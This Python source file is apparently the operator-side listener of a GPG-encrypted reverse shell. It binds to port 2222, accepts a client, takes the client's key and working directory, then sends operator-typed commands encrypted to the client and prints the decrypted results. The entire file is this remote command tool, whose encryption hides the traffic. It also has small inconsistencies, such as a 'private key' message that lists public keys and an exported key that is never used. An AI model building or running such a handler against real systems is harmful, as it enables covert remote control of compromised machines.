from os import times
import socket
import sys
import gnupg

def send_cipher(msg):
    ciphertext = gpg.encrypt(msg, client_key, always_trust=True)
    client.send(ciphertext.data)

def recv_cipher():
    ciphertext = client.recv(BUFFER_SIZE)
    plaintext = gpg.decrypt(ciphertext.decode())
    return plaintext.data.decode()

HOST = "0.0.0.0"
PORT = 2222
BUFFER_SIZE = 4096

gpg = gnupg.GPG()
gpg.encoding = 'utf-8'

print("Loading private key...")
public_keys = gpg.list_keys()
for key in public_keys:
    if key["uids"][0] == "Server <server@example.com>":
        public_key = key

public_key_pem = gpg.export_keys(public_key["keyid"])

print(f"--> Server Started on {HOST}!")
print("--> Listening For Client Connection...")

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))

server.listen(1)

print("Waiting for connection...")
while True:
    client, client_ip = server.accept()
    print(f"Connection from {client_ip}")

    pwd = client.recv(BUFFER_SIZE).decode()

    client.send(b"ok")

    client_key = gpg.import_keys(client.recv(BUFFER_SIZE).decode())
    client_key = client_key.fingerprints[0]

    while True:           
        message_command = input(f'Pwd: {pwd} > ')
      
        # Exiting keyword
        if message_command == "exit":
            print("Closing...")
            send_cipher("exit")
            client.close()
            server.close()
            sys.exit()

        if message_command.startswith("cd"):
            send_cipher(message_command.encode())
            pwd = recv_cipher()
            continue

        if message_command == "":
            print("Missing command!")
            continue
        
        send_cipher(message_command.encode())

        receive_message = recv_cipher()
        
        print(receive_message)